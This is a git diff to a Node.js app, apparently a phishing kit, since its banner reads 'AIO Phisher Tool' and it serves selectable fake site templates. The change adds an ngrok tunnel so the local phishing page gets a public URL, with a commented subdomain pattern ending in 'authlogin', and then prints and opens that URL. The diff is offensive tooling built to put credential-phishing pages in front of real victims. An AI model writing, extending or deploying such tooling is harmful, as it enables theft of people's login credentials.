@@ -7,6 +7,7 @@ const colors = require("colors")
 const fs = require('fs');
 const path = require("path")
 const open = require('open');
+const ngrok = require('ngrok');
 const ascii = require('ascii-table');
 const ms = require('ms')
 const Discord = require("discord.js")
@@ -49,6 +50,18 @@ app.get("/info", async (req, res) => {
     return res.render(`pages/index`)
 })
 app.listen(config.server.port, async () => {
+    const url = await ngrok.connect({
+        proto: 'http', // http|tcp|tls, defaults to http
+        addr: config.server.port, // port or network address, defaults to 80
+        // auth: 'user:pwd', // http basic authentication for tunnel
+        // subdomain: `${chooses[answer].name}authlogin`, // reserved tunnel name https://alex.ngrok.io
+        authtoken: config.ngrokAuth, // your authtoken from ngrok.com
+        region: 'us', // one of ngrok regions (us, eu, au, ap, sa, jp, in), defaults to us
+        // configPath: '~/git/project/ngrok.yml', // custom path for ngrok config file
+        // binPath: path => path.replace('app.asar', 'app.asar.unpacked'), // custom binary path, eg for prod in electron
+        // onStatusChange: status => { }, // 'closed' - connection is lost, 'connected' - reconnected
+        // onLogEvent: data => { }, // returns stdout messages from ngrok process
+    }).catch(e=>{return console.log(colors.bgRed(`[ERR]`) + colors.red(` Can't start ngrok session!`))})
     console.log(colors.bgGreen(`[OK]`) + colors.green(` Server is working at port ${config.server.port}`))
     let table = new ascii(`AIO Phisher Tool`);
     // table.setHeading("List of able templates");
@@ -62,8 +75,8 @@ app.listen(config.server.port, async () => {
             await console.log(colors.bgRed(`[ERR]`) + colors.red(` Can't find your selection!`))
             return process.exit()
         }
-        console.log(colors.bgGreen(`[OK]`) + colors.green(` You selected ${chooses[answer].name}, try it at http://localhost:${config.server.port} to see!`))
-        open(`http://localhost:${config.server.port}`).catch(e=>{});
+        console.log(colors.bgGreen(`[OK]`) + colors.green(` You selected ${chooses[answer].name}, try it at: \nhttp://localhost:${config.server.port}\n${url}`))
+        open(url).catch(e => { });
         app.use("/", express.static(path.resolve(`${dataDir}${path.sep}site${path.sep}${chooses[answer].name}`)));
         app.get("/", async (req, res) => {
             return res.render(`site/${chooses[answer].name}/index`)
